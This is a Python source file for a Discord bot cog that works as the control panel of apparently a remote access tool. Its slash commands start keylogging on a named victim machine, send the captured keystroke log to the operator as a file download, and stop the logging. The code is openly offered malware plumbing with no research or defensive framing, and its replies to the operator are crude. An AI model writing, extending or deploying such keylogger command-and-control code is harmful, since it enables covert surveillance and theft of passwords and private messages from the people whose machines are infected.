import discord
from discord import app_commands
from discord.ext import commands

import keylog_store
import machines


class KeylogCog(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@app_commands.command(name="keylog", description="start keylogging")
	@app_commands.describe(alias="machine name")
	async def keylog(self, interaction, alias: str):
		m = machines.get(alias, interaction.user.id)
		if not m:
			await interaction.response.send_message("wtf??", ephemeral=True)
			return

		await interaction.response.defer(ephemeral=True, thinking=True)
		started = await keylog_store.start(alias, m["mid"], m.get("pub"))
		if started:
			await interaction.followup.send(
				f"keylogging `{alias}`; use `/keystrokes {alias}` to download afterwards lol")
		else:
			await interaction.followup.send(f"already keylogging `{alias}` lol")

	@app_commands.command(name="keystrokes", description="download all keystrokes logged so far")
	@app_commands.describe(alias="machine name")
	async def keystrokes_cmd(self, interaction, alias: str):
		m = machines.get(alias, interaction.user.id)
		if not m:
			await interaction.response.send_message("unknown machine", ephemeral=True)
			return

		path = keylog_store.path(alias)
		if path is None:
			await interaction.response.send_message("nothing logged dumbass", ephemeral=True)
			return

		await interaction.response.defer(ephemeral=True, thinking=True)
		await interaction.followup.send(
			file=discord.File(path, filename=f"{alias}-keystrokes.log"))

	@app_commands.command(name="keylogstop", description="stop keylogging")
	@app_commands.describe(alias="machine name")
	async def keylogstop(self, interaction, alias: str):
		m = machines.get(alias, interaction.user.id)
		if not m:
			await interaction.response.send_message("unknown machine", ephemeral=True)
			return

		if keylog_store.stop(alias):
			await interaction.response.send_message(f"stopped keylogging `{alias}`", ephemeral=True)
		else:
			await interaction.response.send_message(f"not keylogging `{alias}`", ephemeral=True)


async def setup(bot):
	await bot.add_cog(KeylogCog(bot))
